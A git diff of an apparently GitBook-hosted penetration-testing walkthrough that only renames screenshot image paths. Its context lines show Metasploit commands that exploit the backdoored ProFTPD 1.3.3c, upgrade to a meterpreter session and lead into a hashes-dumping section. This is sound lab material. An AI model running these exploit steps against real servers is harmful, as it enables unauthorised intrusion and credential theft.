@@ -57,7 +57,7 @@ service postgresql start && msfconsole -q
 msf5 > search proftpd
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Start a metasploit framework and exploit proftpd server using `exploit/unix/ftp/proftpd_133c_backdoor` module.
 
@@ -67,7 +67,7 @@ msf5 > use exploit/unix/ftp/proftpd_133c_backdoor
 msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Upgrade the sessions to a `meterpreter` session
 
@@ -78,14 +78,14 @@ sessions # check available sessions
 sessions 2
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 meterpreter > sysinfo
 meterpreter > getuid
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Hashes Dumping <a href="#hashes-dumping" id="hashes-dumping"></a>
 
